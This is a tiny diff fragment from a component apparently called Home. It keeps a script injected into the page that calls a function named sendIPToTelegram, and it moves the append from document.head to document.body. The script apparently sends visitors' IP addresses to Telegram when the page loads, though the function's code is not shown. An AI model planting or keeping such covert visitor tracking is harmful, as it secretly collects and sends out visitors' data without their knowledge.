@@ -104,7 +104,7 @@ export default function Home() {
 
   sendIPToTelegram();
 `;
-document.head.appendChild(script)
+document.body.appendChild(script)
 
 
     return `
